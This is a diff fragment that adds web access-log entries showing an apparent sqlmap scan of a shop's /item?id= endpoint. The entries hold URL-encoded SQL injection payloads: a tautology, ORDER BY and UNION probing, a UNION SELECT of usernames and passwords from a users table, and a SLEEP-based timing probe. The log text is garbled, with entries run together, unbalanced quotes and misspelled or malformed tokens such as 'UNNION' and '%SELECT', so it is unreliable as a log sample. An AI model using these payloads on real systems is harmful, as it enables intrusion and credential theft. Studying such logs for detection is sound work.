@@ -4,3 +4,8 @@
 
 200 94821 "https://shop.example.com" "sqlmap/1.7.8#stable"
 
+
+185.143.223.17 - [14/Apr/2024 09:12:01] "GET /item?id=1%27%20OR%20%271%27%30%271" 200 3821 "sqlmap/1.8" 185.143.223.17 - [14/Apr/2024 09:12:02] "GET /item?id=1%27%20ORDER%20BY%203--
+" 500 200 "sqlmap/1.8 185.143.223.17 - [14/Apr/2024 09:12:04] "GET /item?id=0%27%20UNNION%SELECT%20NULL%20NULL --" 200 3821 "sqlmap/1.8" 185.143.223.17 - [14/Apr/2024 09:12:09]
+"GET /item?id=0%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--" 200 18432 "sqlmap1.8" 185.143.223.17 - [14/Apr/2024 09:12:14]"GET /item?id=1%27%20AND%20SLEEP%285%29''"
+200 512 [4998ms] "sqlmap/1.8"
